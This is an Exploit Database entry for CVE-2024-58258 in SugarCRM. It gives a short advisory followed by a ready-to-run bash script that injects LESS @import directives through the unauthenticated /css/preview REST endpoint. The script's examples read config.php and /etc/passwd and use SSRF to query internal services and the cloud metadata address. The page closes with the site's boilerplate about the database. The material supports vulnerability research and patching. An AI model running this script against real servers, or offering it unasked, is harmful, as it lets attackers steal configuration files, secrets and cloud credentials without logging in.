# Exploit Title : SugarCRM 14.0.0 - SSRF/Code Injection
# Author: Egidio Romano aka EgiX
# Email : n0b0d13s@gmail.com

# Software Link: https://www.sugarcrm.com
# Affected Versions: All commercial versions before 13.0.4 and 14.0.1.
# CVE Reference: CVE-2024-58258
# Vulnerability Description:

User input passed through GET parameters to the /css/preview REST API
endpoint is not properly sanitized before parsing it as LESS code. This can
be exploited by remote, unauthenticated attackers to inject and execute
arbitrary LESS directives. By abusing the @import LESS statement, an
attacker can trigger Server-Side Request Forgery (SSRF) or read arbitrary
local files on the web server, potentially leading to the disclosure of
sensitive information.

# Proof of Concept:

#!/bin/bash

echo
echo "+----------------------------------------------------------------------+";
echo "| SugarCRM <= 14.0.0 (css/preview) LESS Code Injection Exploit by EgiX |";
echo "+----------------------------------------------------------------------+";

if [ "$#" -ne 2 ]; then
    echo -ne "\nUsage.....: $0 <SugarCRM URL> <Local File or SSRF URL>\n"
    echo -ne "\nExample...: $0 'http://localhost/sugarcrm/' 'config.php'"
    echo -ne "\nExample...: $0 'http://localhost/sugarcrm/' '/etc/passwd'"
    echo -ne "\nExample...: $0 'https://www.sugarcrm.com/' 'http://localhost:9200/_search'"
    echo -ne "\nExample...: $0 'https://www.sugarcrm.com/' 'http://169.254.169.254/latest/meta-data/'\n\n"
    exit 1
fi

urlencode() {
    echo -n "$1" | xxd -p | tr -d '\n' | sed 's/../%&/g'
}

INJECTION=$(urlencode "1; @import (inline) '$2'; @import (inline) 'data:text/plain,________';//")
RESPONSE=$(curl -ks "${1}rest/v10/css/preview?baseUrl=1&param=${INJECTION}")

if echo "$RESPONSE" | grep -q "________"; then
    echo -e "\nOutput for '$2':\n"
    echo "$RESPONSE" | sed '/________/q' | grep -v '________'
    echo
else
    echo -e "\nError: exploit failed!\n"
    exit 2
fi

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Goog...
